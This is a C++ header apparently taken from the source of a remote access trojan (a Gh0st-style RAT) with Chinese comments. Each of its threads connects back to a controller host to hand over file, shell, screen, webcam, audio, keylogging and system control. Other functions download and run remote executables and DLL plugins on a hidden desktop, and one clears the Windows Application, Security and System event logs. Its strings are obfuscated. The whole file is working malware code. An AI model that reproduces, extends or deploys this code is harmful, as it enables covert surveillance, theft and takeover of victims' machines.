#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "until.h"
#include "install.h"
#include <wininet.h>

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	TCHAR szModule [MAX_PATH-1];
	char	strKeyboardOfflineRecord[MAX_PATH];
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	CKeyboardManager::MyGetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
	lstrcat(strKeyboardOfflineRecord, "\\desktop.inf");

	if (GetFileAttributes(strKeyboardOfflineRecord) != -1)
	{
		int j = 1;
		g_bSignalHook = j;
	}
	else
	{
//		CloseHandle(CreateFile( strKeyboardOfflineRecord, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
//		g_bSignalHook = true;
		int i = 0;
		g_bSignalHook = i;
	}
//		g_bSignalHook = false;

	while (1)
	{
		while (g_bSignalHook == 0)
		{
			Sleep(100);
		}
		CKeyboardManager::StartHook();
		while (g_bSignalHook == 1)
		{
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
			Sleep(100);
		}
		CKeyboardManager::StopHook();
	}

	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = lstrlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str1[50] = "GQlKjY.B:UTYeRj";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), 12 );
	si.lpDesktop = str1; 
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return true;
}


//如果用urldowntofile的话，程序会卡死在这个函数上
bool UpdateServer(LPCTSTR lpURL)
{
	const char	*lpFileName = NULL;
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str1[50] = "GQlKjY.B:UTYeRj";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), 12 );
	si.lpDesktop = str1; 
	return CreateProcess(lpFileName, "n1p5d4a1te", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;

	// System 权限下不能直接利用shellexecute来执行
	char	lpSubKey[50] = "9nnRQ[YjQolkBQUfnRohU,UfUBkVURRBonUlB[ommYlZ";
	EncryptData( (unsigned char *)&lpSubKey, 0, 12 );
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (CKeyboardManager::Mylstrlen(strIEPath) == 0)
		return false;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str1[50] = "GQlKjY.B:UTYeRj";
	EncryptData( (unsigned char *)&str1, 0, 12 );
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = str1; 

	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return 0;
}

void CleanEvent()
{
	char str1[50] = "9nnRQ[YjQol";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), 12 );
	char str2[50] = "KU[ehQja";
	EncryptData( (unsigned char *)&str2, lstrlen(str2), 12 );
	char str3[50] = "KakjUm";
	EncryptData( (unsigned char *)&str3, lstrlen(str3), 12 );
	char *strEventName[] = { str1, str2, str3};

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	char str1[50] = "KAKJ5MB;ehhUlj;oljhoRKUjBKUhdQ[UkB";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), 12 );
	lstrcat( str1, "%s" );
	wsprintf(strSubKey, str1, lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
}

DWORD WINAPI Loop_CHAJIAN(LPVOID lparam)
{
	TCHAR szModule [MAX_PATH];
	int	nLength = lstrlen( (char*)lparam );
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	char *Url = new char[nLength+1];
	lstrcpy( Url, (char*)lparam );
	char TmpPath[MAX_PATH] = {0};
	char DllPath[MAX_PATH] = {0};
	CKeyboardManager::MyGetTempPath( sizeof(TmpPath), TmpPath );

//	wsprintf( DllPath, "%s\\fll_%03x.%03d", TmpPath, GetTickCount()%1000, GetTickCount()%1000 );
//	CKeyboardManager::Mylstrcat( TmpPath, "\\fil_" );
	CKeyboardManager::Mylstrcat( TmpPath, CKeyboardManager::NumToStr(GetTickCount()+5,16) );

	HMODULE hDll;
	if ( http_get( Url, DllPath ) )
	{
		typedef	void	(__stdcall *pPluginFunc)();
		hDll = LoadLibrary(DllPath);
		if ( hDll == NULL ) return -1;
		pPluginFunc PluginFunc = (pPluginFunc)CKeyboardManager::MyGetProcAddress( hDll, "PluginFunc" );
		if ( PluginFunc ) PluginFunc();//调用此函数
	}
	FreeLibrary(hDll);
	DeleteFile(DllPath);
	delete[] Url;

	return 0;
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
